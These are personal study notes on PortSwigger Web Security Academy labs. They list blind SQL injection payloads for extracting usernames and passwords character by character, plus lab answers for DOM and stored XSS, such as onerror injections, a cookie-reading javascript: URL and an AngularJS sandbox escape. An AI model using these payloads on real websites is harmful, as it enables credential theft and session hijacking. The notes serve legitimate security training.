# PortSwigger Labs -Notes
Am i getting ready for BSCP? I don't know


## SQL injection
###  blind - Conditional Responses
    Take a look and see wheather the page displays certain messages. Page's size is handful.

    * You might use it to determine if the username existing within the table
        This queries evaluates if the given username exists inside the table
        and (select 'a' from users where username = 'foo')='a
    
    * To get the password length. 
        and (select 'a' from users where username = 'foo' and length(password)>1)='a

    * To get the password by issuing one char at a time while looping through the password length
        The incremental must be where the first 1 is at.
        and (select substring(password,1,1) from users where username = 'foo')=§
    

### blind - Trigerring conditional errors

    * It can be used to return a database error (stack trace??) containing a specific given payload
        this payload `select` something. If this `thing` equal to 1 it gets devided by 0 or it `echoes` back a letter
        and (select case when (1=1) then 1/0 else 'a)='a

        #SUBSTRING PASSWORD GUESSING WITH CASE - HOME LAB
        select password (case when substring(password, 2,1) = 'u' then "RIGHT" else "NOOO" end) from blah where user = 'nobody';
## XSS
### DOM XSS in document.write sink using source location.search [APPRENTICE]
    answer: "><img%20src=x%20onerror=alert()>

### DOM XSS in document.write sink using source location.search inside a select element [PRACTITIONER]
    answer: &storeId=</option><script>alert()</script>

### DOM XSS in innerHTML sink using source location.search [APPRENTICE]
    answer: '><img src=x onerror=alert()>

### DOM XSS in jQuery anchor href attribute sink using location.search source [APPRENTICE]
    answer: javascript:alert(document.cookie)

### DOM XSS in jQuery selector sink using a hashchange event [APPRENTICE]
    answer: <iframe height="900" width="900" src="https://0abd009b04972d7c8140164f002a0029.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>

### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded [APPRENTICE]
    answer: {{constructor.constructor('alert(1)')()}}

### Reflected DOM XSS [PRACTITIONER]
    answer: \"-alert()}//

### Stored DOM XSS
    answer: bar</section></p>foo<img src=x onerror=alert()>
